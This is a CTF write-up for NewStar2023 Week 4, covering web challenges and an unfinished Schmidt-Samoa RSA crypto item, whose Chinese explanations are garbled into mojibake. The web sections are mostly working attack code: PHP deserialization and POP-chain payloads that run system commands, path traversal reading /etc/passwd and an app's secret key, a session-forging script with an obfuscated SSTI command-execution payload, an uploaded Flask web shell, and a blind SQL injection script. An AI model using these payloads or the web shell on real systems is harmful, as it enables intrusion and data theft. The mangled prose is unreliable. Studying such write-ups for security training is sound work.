[{"title":"NewStar2023 Week4","url":"/NewStar2023-WriteUp-Week4/","content":"\n## week4\n\n### web\n\n#### é€ƒ\n\né¢˜ç›®ï¼š\n\n```php\n <?php\nhighlight_file(__FILE__);\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key;\n    public $cmd = \"whoami\";\n    public function __construct($key)\n    {\n        $this->key = $key;\n    }\n    public function __destruct()\n    {\n        system($this->cmd);\n    }\n}\n\nunserialize(waf(serialize(new GetFlag($_GET['key'])))); www-data www-data \n```\n\n**ç»å…¸çš„phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸**\n\né¦–å…ˆæ„é€ åºåˆ—åŒ–ä»£ç ï¼š\n\n```php\n<?php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key='bad';   \n    public $cmd = \"ls /\";\n}\n\n$a = new GetFlag();\necho serialize($a).\"\\n\";\n```\n\n`O:7:\"GetFlag\":2:{s:3:\"key\";s:3:\"bad\";s:3:\"cmd\";s:4:\"ls /\";}`\n\næˆ‘ä»¬éœ€è¦é€ƒé€¸çš„æ˜¯`\";s:3:\"cmd\";s:4:\"ls /\";}`\n\n```php\n<?php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key='\";s:3:\"cmd\";s:4:\"ls /\";}';  \n    public $cmd = \"ls /\";\n}\n\n$a = new GetFlag();\necho serialize($a).\"\\n\";\n```\n\n\n\n`O:7:\"GetFlag\":2:{s:3:\"key\";s:24:\"\";s:3:\"cmd\";s:4:\"ls /\";}\";s:3:\"cmd\";s:4:\"ls /\";}`\n\næ€»å…±24ä¸ªå­—ç¬¦ï¼Œäºæ˜¯æˆ‘ä»¬å†™24ä¸ªbadå°±è¡Œ\n\n```php\n<?php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key='badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:4:\"ls /\";}';  \n    public $cmd = \"ls /\";\n}\n\n$a = new GetFlag();\necho serialize($a).\"\\n\";\n\n$res = waf(serialize($a));\necho $res.\"\\n\";\n\n$c = unserialize($res);\nprint_r($c).\"\\n\";\necho $c->cmd;\n```\n\nè¿è¡Œç»“æœï¼š\n\n```php\nO:7:\"GetFlag\":2:{s:3:\"key\";s:96:\"badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:4:\"ls /\";}\";s:3:\"cmd\";s:4:\"ls /\";}\nO:7:\"GetFlag\":2:{s:3:\"key\";s:96:\"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood\";s:3:\"cmd\";s:4:\"ls /\";}\";s:3:\"cmd\";s:4:\"ls /\";}\nGetFlag Object\n(\n    [key] => goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood\n    [cmd] => ls /\n)\nls /\n```\n\npayloadï¼š\n\n`key = badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:4:\"ls /\";}\" `\n\n![image-20231030150507471](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231030150507471.png)\n\næ¥ç€æ„é€ payloadæŸ¥çœ‹flag\n\n`/?key=.badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:9:\"cat /flag\";}`\n\n![image-20231030150810755](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231030150810755.png)\n\n#### More Fast\n\né¢˜ç›®ï¼š\n\n```php\n <?php\nhighlight_file(__FILE__);\n\nclass Start{\n    public $errMsg;\n    public function __destruct() {\n        die($this->errMsg);\n    }\n}\n\nclass Pwn{\n    public $obj;\n    public function __invoke(){\n        $this->obj->evil();\n    }\n    public function evil() {\n        phpinfo();\n    }\n}\n\nclass Reverse{\n    public $func;\n    public function __get($var) {\n        ($this->func)();\n    }\n}\n\nclass Web{\n    public $func;\n    public $var;\n    public function evil() {\n        if(!preg_match(\"/flag/i\",$this->var)){\n            ($this->func)($this->var);\n        }else{\n            echo \"Not Flag\";\n        }\n    }\n}\n\nclass Crypto{\n    public $obj;\n    public function __toString() {\n        $wel = $this->obj->good;\n        return \"NewStar\";\n    }\n}\n\nclass Misc{\n    public function evil() {\n        echo \"good job but nothing\";\n    }\n}\n\n$a = @unserialize($_POST['fast']);\nthrow new Exception(\"Nope\");\nFatal error: Uncaught Exception: Nope in /var/www/html/index.php:55 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 55\n\n```\n\né¦–å…ˆå°±æ˜¯æ„é€ popé“¾ï¼š\n\n>//ç›®çš„æ˜¯è§¦å‘Webä¸­çš„evilå‡½æ•° æ‰§è¡Œ system (cat /f*)\n>\n>//éœ€è¦è§¦å‘Web->evil()å‡½æ•° å°±éœ€è¦è§¦å‘Pwnä¸­çš„__invoke()æ–¹æ³•\n>\n>//éœ€è¦è§¦å‘Pwnä¸­çš„\\__invoke()æ–¹æ³• å°±éœ€è¦è§¦å‘Reverseä¸­çš„__get()æ–¹æ³• --> è°ƒç”¨ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§ \n>\n>//éœ€è¦è§¦å‘Reverseä¸­çš„\\__get()æ–¹æ³•  å°±éœ€è¦è§¦å‘Cryptoä¸­çš„__toString()æ–¹æ³• --> è¢«å½“æˆä¸€ä¸ªå¯¹è±¡æ—¶è°ƒç”¨\n>\n>//éœ€è¦è§¦å‘Cryptoä¸­çš„\\__toString()æ–¹æ³• å°±éœ€è¦é€šè¿‡startä¸­çš„__destruct()æ–¹æ³•\n\næ‰€ä»¥å®Œæ•´çš„popé“¾ï¼š**\\_\\_destruct()->\\_\\_toString()->\\__get($var)->\\_\\_invoke()->Web**\n\næ„é€ pocï¼š\n\n```php\n<?php\nclass Start{\n    public $errMsg;\n}\n\nclass Pwn{\n    public $obj;\n\n}\n\nclass Reverse{\n    public $func;\n\n}\n\nclass Web{\n    public $func = \"system\";\n    public $var = \"cat /f*\";\n}\n\nclass Crypto{\n    public $obj;\n\n}\n\n$a = new Start();\n$a->errMsg = new Crypto();\n$b = $a->errMsg;\n$b->obj = new Reverse();\n$c = $b->obj;\n$c->func = new Pwn();\n$d = $c->func;\n$d->obj = new Web();\necho serialize($a);\n```\n\n`O:5:\"Start\":1:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:7:\"cat /f*\";}}}}}`\n\næ ¹æ®é¢˜ç›®æç¤ºä»¥åŠæºä»£ç ä¸­å‡ºç°`throw new Exception(\"Nope\");`\n\nè¿™ä¼šå¯¼è‡´ååºåˆ—åŒ–ä¹‹åç›´æ¥ç»è¿‡å¼‚å¸¸æŠ¥é”™ï¼Œå¯¼è‡´åé¢çš„__destruct() æ— æ³•è§¦å‘\n\n> **å¿«é€Ÿè§¦å‘destruct**\n>\n> 1. ä¿®æ”¹åºåˆ—åŒ–æ•°å­—çš„ä¸ªæ•°\n>\n>    åŸpaylaodï¼šO:5:\"Start\":1:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:7:\"cat /f*\";}}}}}\n>\n>    ç°payloadï¼šO:5:\"Start\":**2**:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:7:\"cat /f*\";}}}}}\n>\n> 2. å»æ‰åºåˆ—åŒ–å°¾éƒ¨(å»æ‰ç”Ÿæˆçš„åºåˆ—åŒ–å­—ç¬¦ä¸²æœ€åçš„ä¸€ä¸ªå¤§æ‹¬å·)\n>\n>    O:5:\"Start\":1:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:7:\"cat /f*\";}}}}\n\n\n\nçŸ¥è¯†ç‚¹ï¼š\n\n1. PHPä¸­ï¼Œå¦‚æœå•ç‹¬æ‰§è¡Œunserializeå‡½æ•°è¿›è¡Œå¸¸è§„çš„ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¢«ååºåˆ—åŒ–åçš„æ•´ä¸ªå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå°±ä»…é™äºè¿™ä¸ªå‡½æ•°æ‰§è¡Œçš„ç”Ÿå‘½å‘¨æœŸï¼Œå½“è¿™ä¸ªå‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œè¿™ä¸ªç±»å°±æ²¡äº†ï¼Œåœ¨æœ‰ææ„å‡½æ•°çš„æƒ…å†µä¸‹å°±ä¼šæ‰§è¡Œå®ƒã€‚\n\n2. PHPä¸­ï¼Œå¦‚æœç”¨ä¸€ä¸ªå˜é‡æ¥ä½ååºåˆ—åŒ–å‡½æ•°çš„è¿”å›å€¼ï¼Œé‚£ä¹ˆè¢«ååºåˆ—åŒ–çš„å¯¹è±¡å…¶ç”Ÿå‘½å‘¨æœŸå°±ä¼šå˜é•¿ï¼Œç”±äºå®ƒä¸€ç›´éƒ½å­˜åœ¨äºè¿™ä¸ªå˜é‡å½“ä¸­ï¼Œé‚£ä¹ˆåœ¨PHPè„šæœ¬èµ°å®Œæµç¨‹ä¹‹åï¼Œè¿™ä¸ªå¯¹è±¡æ‰ä¼šè¢«é”€æ¯ï¼Œåœ¨æœ‰ææ„å‡½æ•°çš„æƒ…å†µä¸‹å°±ä¼šå°†å…¶æ‰§è¡Œã€‚\n\n#### InjectMe\n\n**è€ƒç‚¹**ï¼šç›®å½•ç©¿è¶Š+sessionä¼ªé€ +SSTI bypass\n\ndockerfile:\n\n```bash\nFROM vulhub/flask:1.1.1\nENV FLAG=flag{not_here}\nCOPY src/ /app\nRUN mv /app/start.sh /start.sh && chmod 777 /start.sh\nCMD [ \"/start.sh\" ]\nEXPOSE 8080\n```\n\næ ¹æ®é¢˜ç›®æç¤º`ç©¿è¶Šæˆ‘çš„ç§˜å¯†ï¼Œç‹ ç‹ åœ°æ³¨å…¥ï¼`ä»¥åŠæ‰“å¼€é¢˜ç›®ç‚¹å‡»å›¾ç‰‡ï¼Œç‚¹åˆ°110.jpgå‘ç° æ˜¯pythonçš„flaskæ¡†æ¶\n\n![image-20231102152240462](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231102152240462.png)\n\nçŒœæµ‹å¯èƒ½æ˜¯`ç›®å½•ç©¿è¶Š`ï¼Œç”±äºå†™åˆ°å°†â€œ../â€æ›¿æ¢æˆâ€œâ€ï¼Œäºæ˜¯æ„é€ `..././..././..././..././etc/passwd`-->`../../../../etc/passwd`  æˆ–è€… `....//....//....//....//etc/passwd`\n\nä¸‹è½½æ–‡ä»¶å¾—åˆ°ï¼š\n\n```bash\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n```\n\næ²¡æœ‰å‘ç°æœ‰ç”¨ä¿¡æ¯ï¼Œæ¥ç€æ‰¾åˆ°dockerfileæ–‡ä»¶ä¸­å­˜åœ¨appç›®å½•ï¼Œäºæ˜¯çŒœæµ‹æœåŠ¡å™¨è¿è¡Œä»£ç app.pyä»£ç å­˜åœ¨å…¶ä¸­ï¼Œè®¿é—®ä¸‹è½½ `....//....//....//....//app/app.py`\n\n```python\nimport os\nimport re\n\nfrom flask import Flask, render_template, request, abort, send_file, session, render_template_string\nfrom config import secret_key\n\napp = Flask(__name__)\napp.secret_key = secret_key\n\n\n@app.route('/')\ndef hello_world():  # put application's code here\n    return render_template('index.html')\n\n\n@app.route(\"/cancanneed\", methods=[\"GET\"])\ndef cancanneed():\n    all_filename = os.listdir('./static/img/')\n    filename = request.args.get('file', '')\n    if filename:\n        return render_template('img.html', filename=filename, all_filename=all_filename)\n    else:\n        return f\"{str(os.listdir('./static/img/'))} <br> <a href=\\\"/cancanneed?file=1.jpg\\\">/cancanneed?file=1.jpg</a>\"\n\n\n@app.route(\"/download\", methods=[\"GET\"])\ndef download():\n    filename = request.args.get('file', '')\n    if filename:\n        filename = filename.replace('../', '')\n        filename = os.path.join('static/img/', filename)\n        print(filename)\n        if (os.path.exists(filename)) and (\"start\" not in filename):\n            return send_file(filename)\n        else:\n            abort(500)\n    else:\n        abort(404)\n\n\n@app.route('/backdoor', methods=[\"GET\"])\ndef backdoor():\n    try:\n        print(session.get(\"user\"))\n        if session.get(\"user\") is None:\n            session['user'] = \"guest\"\n        name = session.get(\"user\")\n        if re.findall(\n                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\\+|request|cat|tac|base64|nl|hex|\\\\u|\\\\x|\\.',\n                name):\n            abort(500)\n        else:\n            return render_template_string(\n                'ç«Ÿç„¶ç»™<h1>%s</h1>ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ <br> é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!<br> æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜' % name)\n    except Exception:\n        abort(500)\n\n\n@app.errorhandler(404)\ndef page_not_find(e):\n    return render_template('404.html'), 404\n\n\n@app.errorhandler(500)\ndef internal_server_error(e):\n    return render_template('500.html'), 500\n\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=8080)\n\n```\n\nå®¡è®¡æºç å‘ç°ï¼š`from config import secret_key` ä»¥åŠ`@app.route('/backdoor', methods=[\"GET\"])`\n\n1. `from config import secret_key`ï¼Œé¦–å…ˆæ ¹æ®æ­¤çŒœæµ‹å¯èƒ½å­˜åœ¨config.pyæ–‡ä»¶ï¼Œå…¶ä¸­å­˜åœ¨secret_key\n\näºæ˜¯è®¿é—®ä¸‹è½½`....//....//....//....//app/config.py`\n\nå¾—åˆ°ï¼š`secret_key = \"y0u_n3ver_k0nw_s3cret_key_1s_newst4r\"`\n\n2. ä¼ªé€ seesionï¼Œè¿›è¡Œæ¨¡æ¿æ³¨å…¥ï¼Œæœ‰å…³é”®å­—è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨å…«è¿›åˆ¶ç»•è¿‡\n\nå®˜æ–¹è„šæœ¬æ›´æ”¹ç›¸å…³ä¿¡æ¯ï¼š\n\n```python\nimport re\nimport requests\nimport subprocess\n\n\n# æŠŠè¿™ä¸ªä¸‹è½½äº†ï¼Œéœ€è¦ä½¿ç”¨é‡Œé¢çš„flask-session-cookie-manager3.py\n# https://github.com/noraj/flask-session-cookie-manager\ndef string_to_octal_ascii(s):\n    octal_ascii = \"\"\n    for char in s:\n        char_code = ord(char)\n        octal_ascii += \"\\\\\\\\\" + format(char_code, '03o')\n    # octal_ascii += \"\\\\\\\\\" + format(char_code, 'o')\n    return octal_ascii\n\n\nsecret_key = \"y0u_n3ver_k0nw_s3cret_key_1s_newst4r\"\n# payload = \"{%print(7*7)%}\"\n# payload = \"{%print(\\\"\\\"\\\\\\\\u005f\\\\\\\\u005f\\\"\\\")%}\"\n# payload = \"{%print(\\\"\\\"\\\\\\\\x5f\\\\\\\\x5f\\\"\\\")%}\"\neval_shell = \"\\\"\\\"\" + string_to_octal_ascii(\"__import__(\\\"os\\\").popen(\\\"cat /*\\\").read()\") + \"\\\"\\\"\"\nprint(eval_shell)\n# dockeréƒ¨ç½²&windowsè¿è¡Œpayload\n# {{x.__init__.__globals__.__builtins__.eval('__import__(\"os\").popen(\"dir\").read()')}}\npayload = \"{{%print(xxx|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\151\\\\\\\\156\\\\\\\\151\\\\\\\\164\\\\\\\\137\\\\\\\\137\\\"\\\")|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\154\\\\\\\\157\\\\\\\\142\\\\\\\\141\\\\\\\\154\\\\\\\\163\\\\\\\\137\\\\\\\\137\\\"\\\")|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\145\\\\\\\\164\\\\\\\\151\\\\\\\\164\\\\\\\\145\\\\\\\\155\\\\\\\\137\\\\\\\\137\\\"\\\")(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\142\\\\\\\\165\\\\\\\\151\\\\\\\\154\\\\\\\\164\\\\\\\\151\\\\\\\\156\\\\\\\\163\\\\\\\\137\\\\\\\\137\\\"\\\")|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\145\\\\\\\\164\\\\\\\\151\\\\\\\\164\\\\\\\\145\\\\\\\\155\\\\\\\\137\\\\\\\\137\\\"\\\")(\\\"\\\"\\\\\\\\145\\\\\\\\166\\\\\\\\141\\\\\\\\154\\\"\\\")({0}))%}}\".format(eval_shell)\nprint(payload)\ncommand = \"D:\\\\program\\\\python3\\\\python.exe flask_session_cookie_manager3.py encode -s \\\"{0}\\\" -t \\\"{{'user':'{1}'}}\\\"\".format(secret_key, payload)\nprint(command)\nsession_data = subprocess.check_output(command, shell=True)\nprint(session_data)\n# linuxå’Œwindowsæ¢è¡Œä¸ä¸€æ ·ï¼Œlinuxæ˜¯å»æ‰æœ€åä¸€ä¸ªï¼Œwindowsæ˜¯æœ€åä¸¤ä¸ªã€‚\nsession_data = session_data[:-2].decode('utf-8')\n# session_data = session_data[:-1].decode('utf-8')\nprint(session_data)\nurl = \"http://0b401771-d36b-47ca-8971-2b9dedf4b9e0.node4.buuoj.cn:81/backdoor\"\ncookies = {\"session\": session_data}\nres = requests.get(url=url, cookies=cookies)\n# print(res.text)\npattern = r'<h1>(.*)</h1>'\nresult_content = re.search(pattern, res.text, re.S)\n# print(result_content)\nif result_content:\n    result = result_content.group(1)\n    print(result)\nelse:\n    print(\"something wrong!\")\n\n```\n\n#### flask disk\n\nç‚¹å¼€é¢˜ç›®å‡ºç° `list file`ã€`upload files`ã€`admin manage`\n\nä¾æ¬¡ç‚¹å‡»ï¼Œåˆ°`admin manage`å‡ºç°\n\n![image-20231103153932670](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231103153932670.png)\n\nè¿™èƒ½å¾—åˆ°æ˜¯python flaskæ¡†æ¶ï¼Œè¯´æ˜flaskå¼€å¯äº†debugæ¨¡å¼ï¼Œåœ¨debugæ¨¡å¼ä¸‹app.pyæºæ–‡ä»¶è¢«ä¿®æ”¹åä¼šç«‹åˆ»åŠ è½½ï¼Œåªéœ€ä¸Šä¼ ä¸€ä¸ªèƒ½rceçš„app.pyæ–‡ä»¶æŠŠåŸæ¥çš„è¦†ç›–\n\n```python\nfrom flask import Flask,request\nimport os\napp = Flask(__name__)\n@app.route('/')\ndef index():\n    try:\n        cmd = request.args.get('cmd')\n        date = os.popen(cmd).read()\n        return date\n    except:\n        pass\n\n    return \"1\"\nif __name__ == '__main__':\n    app.run(host='0.0.0.0',port=5000,debug=True)\n```\n\n\n\n> from flask import Flask, requestï¼šå¯¼å…¥äº†Flaskæ¡†æ¶ä»¥åŠrequestæ¨¡å—ï¼Œç”¨äºåˆ›å»ºWebåº”ç”¨ç¨‹åºå’Œå¤„ç†HTTPè¯·æ±‚ã€‚\n>\n> import osï¼šå¯¼å…¥äº†Pythonçš„osæ¨¡å—ï¼Œç”¨äºæ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚\n>\n> app = Flask(\\__name__)ï¼šåˆ›å»ºä¸€ä¸ªFlaskåº”ç”¨ç¨‹åºå®ä¾‹ã€‚\n>\n> @app.route('/')ï¼šå®šä¹‰äº†ä¸€ä¸ªè·¯ç”±ï¼Œå½“ç”¨æˆ·è®¿é—®æ ¹è·¯å¾„('/')æ—¶ï¼Œå°†æ‰§è¡Œä¸‹é¢çš„indexå‡½æ•°ã€‚\n>\n> def index()ï¼šå®šä¹‰äº†ä¸€ä¸ªåä¸ºindexçš„å‡½æ•°ï¼Œç”¨äºå¤„ç†ç”¨æˆ·çš„HTTPè¯·æ±‚ã€‚\n>\n> cmd = request.args.get('cmd')ï¼šä»HTTPè¯·æ±‚çš„æŸ¥è¯¢å‚æ•°ä¸­è·å–åä¸º'cmd'çš„å‚æ•°çš„å€¼ï¼Œè¯¥å€¼åº”è¯¥åŒ…å«ä¸€ä¸ªè¦æ‰§è¡Œçš„æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚\n>\n> date = os.popen(cmd).read()ï¼šä½¿ç”¨os.popenæ‰§è¡Œè·å–åˆ°çš„å‘½ä»¤ï¼Œå¹¶å°†æ‰§è¡Œç»“æœå­˜å‚¨åœ¨dateå˜é‡ä¸­ã€‚\n>\n> return dateï¼šå°†å‘½ä»¤æ‰§è¡Œç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œè¿™æ„å‘³ç€å¦‚æœç”¨æˆ·æä¾›äº†åˆæ³•çš„æ“ä½œç³»ç»Ÿå‘½ä»¤ï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œè¯¥å‘½ä»¤å¹¶è¿”å›ç»“æœã€‚return \"1\"ï¼šå¦‚æœæ²¡æœ‰æä¾›'cmd'å‚æ•°æˆ–å‘ç”Ÿå¼‚å¸¸ï¼ŒæœåŠ¡å™¨å°†è¿”å›å­—ç¬¦ä¸²\"1\"ã€‚\n\næ¥ç€è®¿é—®ï¼š`http://f003e914-33c2-4635-9170-1b7cb9c5f4a8.node4.buuoj.cn:81/?cmd=ls%20/`\n\n`http://f003e914-33c2-4635-9170-1b7cb9c5f4a8.node4.buuoj.cn:81/?cmd=cat%20/flag`\n\n#### midsql\n\nè€ƒå¯Ÿsqlæ—¶é—´ç›²æ³¨ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ— å›æ˜¾\n\n```python\nimport time\nimport requests\n\nresult = ''\nlast = ' '\n\nfor i in range(1, 1000):\n    for j in range(127, 31, -1):\n        url = 'http://3498ba56-0b4f-4a64-b19a-4ef45047e7df.node4.buuoj.cn:81/?id='\n        # payload = f'1/**/and/**/if((ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),{i},1))>{j}),sleep(3),0)' # information_schema,mysql,performance_schema,sys,test,ctf\n        # payload = f'1/**/and/**/if((ascii(substr((select/**/database()),{i},1))>{j}),sleep(3),0)'\n        # payload = f'1/**/and/**/if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/\"ctf\"),{i},1))>{j}),sleep(3),0)'\n        # payload = f'1/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/\"items\"),{i},1))>{j}),sleep(3),0)' # id,name,price\n        # payload = f'1/**/and/**/if((ascii(substr((select/**/group_concat(price)/**/from/**/ctf.items),{i},1))>{j}),sleep(3),0)'\n        # payload = f'1/**/and/**/if((ascii(substr((select/**/group_concat(id,0x3a,name,0x3a,price)/**/from/**/ctf.items),{i},1))>{j}),sleep(3),0)'\n        payload = f'1/**/and/**/if((ascii(substr((select/**/group_concat(name)/**/from/**/ctf.items),{i},1))>{j}),sleep(4),0)'\n        url = url + payload\n        # print(url)\n        start_time = time.time()\n        response = requests.get(url=url)\n        end_time = time.time()\n        if (end_time - start_time) >3:\n            last = result\n            result += chr(j + 1)\n            break\n    print(result)\n```\n\n\n\n### crypto \n\n#### RSA Variation II\n\né¢˜ç›®ï¼š\n\n```python\nfrom secret import flag\nfrom Crypto.Util.number import *\n\np = getPrime(1024)\nq = getPrime(1024)\n\nN = p*p*q\n\nd= inverse(N, (p-1)*(q-1)//GCD(p-1, q-1))\n\nm = bytes_to_long(flag)\n\nc = pow(m, N, N)\n\nprint('c =', c)\nprint('N =', N)\nprint('d =', d)\n\n# c = 1653396627113549535760516503668455111392369905404419847336187180051939350514408518095369852411718553340156505246372037811032919080426885042549723125598742783778413642221563616358386699697645814225855089454045984443096447166740882693228043505960011332616740785976743150624114653594631779427044055729185392854961786323215146318588164139423925400772680226861699990332420246447180631417523181196631188540323779487858453719444807515638025771586275969579201806909799448813112034867089866513864971414742370516244653259347267231436131850871346106316007958256749016599758599549180907260093080500469394473142003147643172770078092713912200110043214435078277125844112816260967490086038358669788006182833272351526796228536135638071670829206746835346784997437044707950580087067666459222916040902038574157577881880027391425763503693184264104932693985833980182986816664377018507487697769866530103927375926578569947076633923873193100147751463\n# N = 1768427447158131856514034889456397424027937796617829756303525705316152314769129050888899742667986532346611229157207778487065194513722005516611969754197481310330149721054855689646133721600838194741123290410384315980339516947257172981002480414254023253269098539962527834174781356657779988761754582343096332391763560921491414520707112852896782970123018263505426447126195645371941116395659369152654368118569516482251442513192892626222576419747048343942947570016045016127917578272819812760632788343321742583353340158009324794626006731057267603803701663256706597904789047060978427573361035171008822467120148227698893238773305320215769410594974360573727150122036666987718934166622785421464647946084162895084248352643721808444370307254417501852264572985908550839933862563001186477021313236113690793843893640190378131373214104044465633483953616402680853776480712599669132572907096151664916118185486737463253559093537311036517461749439\n# d = 20650646933118544225095544552373007455928574480175801658168105227037950105642248948645762488881219576174131624593293487325329703919313156659700002234392400636474610143032745113473842675857323774566945229148664969659797779146488402588937762391470971617163496433008501858907585683428652637958844902909796849080799141999490231877378863244093900363251415972834146031490928923962271054053278056347181254936750536280638321211545167520935870220829786490686826062142415755063724639110568511969041175019898031990455911525941036727091961083201123910761290998968240338217895275414072475701909497518616112236380389851984377079\n```\n\næ ¹æ®é¢˜ç›®æç¤ºSchmidt-Samoaå¯†ç \n\n1. **Schmidt-Samoaå¯†ç ç³»ç»Ÿ**\n\nSchmidt-Samoaå¯†ç ç³»ç»Ÿï¼ŒåƒrabinåŠ å¯†ä¸€æ ·ï¼Œå…¶å®‰å…¨æ€§åŸºäºæ•´æ•°å› å¼åˆ†è§£çš„éš¾åº¦ã€‚ä½† Rabin è§£å¯†æ—¶ä¼šå¾—åˆ°å››ä¸ªè§£ï¼Œè€Œ Schmidt-Samor å¾—åˆ°çš„æ˜¯å”¯ä¸€è§£ã€‚\n\n2. **å¯†é’¥ç”Ÿæˆ**\n\nâ€‹       1.é€‰å–ä¸¤ä¸ªå¤§çš„è´¨æ•°på’Œqå¹¶è¿›è¡Œè®¡ç®— N = p^2^q \n\nâ€‹       2.è®¡ç®— d = invert (N , Ï† (pq)) \n\n3. **åŠ å¯†**\n\nå¯¹æ¶ˆæ¯mï¼Œè®¡ç®—å¯†æ–‡ C = m^N^  mod N\n\n4. **è§£å¯†**\n\nè®¡ç®—æ˜æ–‡ m = C^d^  mod  pq\n\nä¸¾ä¾‹ï¼š\n\n>- p=7, q=11,  N=p^2^q=539 ,  d = N ^-1^ mod  lcm ( p âˆ’ 1 , q âˆ’ 1 ) = 29 \n>- m = 32 ,  c = m^N^ mod N = 373 \n\néªŒè¯ï¼š\n\n>m=c^d^  mod pq = 373 ^29^ mod pq = 373^29^ mod 77 = 32\n\nå…³äºè·å–pqçš„é—®é¢˜\n\nç”± N = p ^2^ âˆ— q , d * N = 1 mod (q-1) (p-1)é€šè¿‡æ¬§æ‹‰å®šç†å¯ä»¥å¾—åˆ°ï¼š\n\n>a ^(p1-)(q-1)^ â‰¡ 1 mod pq\n\næ‰€ä»¥ï¼š\n\n>a^N^ âˆ— d = a^1+kâˆ—(qâˆ’1)(pâˆ’1)^ â‰¡ aâˆ—a^kâˆ—(qâˆ’1)(pâˆ’1)^=a  mod pq \n\næ‰€ä»¥ï¼š\n\n>k âˆ— pq=a^Nâˆ—d^ âˆ’ a\n>pq =  gcd(a^N*d^ - a,N)\n>å› ä¸ºaçš„å–å€¼å¯ä»¥æ˜¯ a = 